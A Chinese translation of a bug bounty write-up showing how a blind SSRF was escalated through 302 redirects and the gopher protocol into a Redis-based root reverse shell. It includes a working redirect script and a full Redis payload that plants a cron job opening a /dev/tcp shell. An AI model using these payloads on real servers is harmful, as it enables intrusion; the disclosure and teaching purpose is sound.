> 原文链接: https://www.anquanke.com//post/id/241238 


# 从SSRF到RCE——一个15k美金的故事


                                阅读量   
                                **205907**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者sirleeroyjenkins，文章来源：sirleeroyjenkins.medium.com
                                <br>原文地址：[https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530﻿](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530%EF%BB%BF)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01e477a4f2c480755e.jpg)](https://p0.ssl.qhimg.com/t01e477a4f2c480755e.jpg)



## 引语

本人在HackerOne的赏金猎人计划中发现某个世界级大型公司的SSRF漏洞，并经过深入研究扩大危害至远程代码执行。



## 阶段1：侦查

对于一项大范围的漏洞挖掘项目，往往会以子域名扫描作为开端。但在这里，我的目标是单个web网站，因此仅仅采用GAU工具获取一系列URL等信息，并分析javascript脚本内容，采用Ffuf获取网站目录信息。至此没有大的收获。

随后，我采用burpsuite作为代理捕获测试所有的网站请求链接，发现一个敏感链接，如下。

```
GET /xxx/logoGrabber?url=http://example.com
Host: site.example.com
…
```

响应信息如下：

```
`{`“responseTime”:”99999ms”,”grabbedUrl”:”http://example.com","urlInfo":`{`"pageTitle":"Example Title”,”pageLogo”:”pagelogourl”`}``}`
```

在此情形下，网站可能存在SSRF漏洞。



## 阶段2：核实SSRF漏洞

无法获得网站的内部ip，而获得了一些子域名。<br>
经测试，发现该敏感链接会返回非公开子域名的信息。例如，一个子域名是somecorpsite.example.com，我访问http://somecorpsite.example.com 是没有响应信息的，但将其放置敏感链接，如下：

```
GET /xxx/logoGrabber?url=http://somecorpsite.example.com
Host: site.example.com
…
```

获得如下响应：

```
`{`“responseTime”:”9ms”,”grabbedUrl”:”http://somecorpsite.example.com","urlInfo":`{`"pageTitle":"INTERNAL PAGE TITLE”,”pageLogo”:”http://somecorpsite.example.com/logos/logo.png"`}``}`
```

这是属于低危的SSRF漏洞，我写并提交了报告，并进一步开展深入研究。



## 阶段3：提升危害性至RCE

SSRF的一种增强型方法是Gopher协议，因此我构造发送如下链接：

```
GET /xxx/logoGrabber?url=gopher://myburpcollaboratorurl
Host: site.example.com
…
```

不幸的是服务器直接返回错误，貌似web网站不支持Gopher协议吧。

另一种增强型方法是重定向。我构造了重定向脚本，如下：

```
!/usr/bin/env python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print(“””
Usage: `{``}` &lt;port_number&gt; &lt;url&gt;
“””.format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header(‘Location’, sys.argv[2])
self.end_headers()
def send_error(self, code, message=None):
self.send_response(302)
self.send_header(‘Location’, sys.argv[2])
self.end_headers()
HTTPServer((“”, int(sys.argv[1])), Redirect).serve_forever()
```

我设定重定向的目标网址是Burp collaborator模块的URL，命令如下：

```
python3 302redirect.py port “http://mycollaboratorurl/”
```

随后构造敏感链接指向我的重定向服务器，如下：

```
GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: site.example.com
…
```

成功返回响应信息，说明重定向增强方法是有效的。

再综合起来，采用叠加增强型方法重定向+Gopher协议。指定重定向的目标网址是采用gopher协议的Burp collaborator模块URL，此时重定向脚本的执行命令是：

```
python3 302redirect.py port “gopher://mycollaboratorurl/”
```

敏感链接的构造结果如下：

```
GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: site.example.com
…
```

成功返回响应信息，说明该叠加增强型方法有效。

并且意外的发现，采用该方法可以访问web网站的内部ip 127.0.0.1。



## 阶段4：后渗透

现在可以访问内部主机，则开始探测它的开放端口，脚本的执行命令是：

```
python3 302redirect.py port “gopher://127.0.0.1:port”
```

同样发送请求，最终发现6379（Redis）端口开放，如下：

```
302redirect → gopher://127.0.0.1:3306 [Response time: 3000ms]-CLOSED
302redirect → gopher://127.0.0.1:9000 [Response time: 2500ms]-CLOSED
302redirect → gopher://127.0.0.1:6379 [Response time: 500ms]-OPEN
etc…
```

可以采用Gopherus来生成Redis反向shell了，如下：

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/x.x.x.x/1337%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/lib/redis%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

此时完整的命令是：

```
python3 302redirect.py port “gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/x.x.x.x/1337%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/lib/redis%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A”
```

当我提交请求时，如下：

```
GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: site.example.com
…
```

过了5分钟，才接收到shell，我输入whoami命令，发现是root用户，于是赶紧断开连接，写报告提交漏洞啦。

这个漏洞是2020年5月发现并提交的，现在已经被解决了。我获得了15000美元和公司的大力赞赏，好好干。
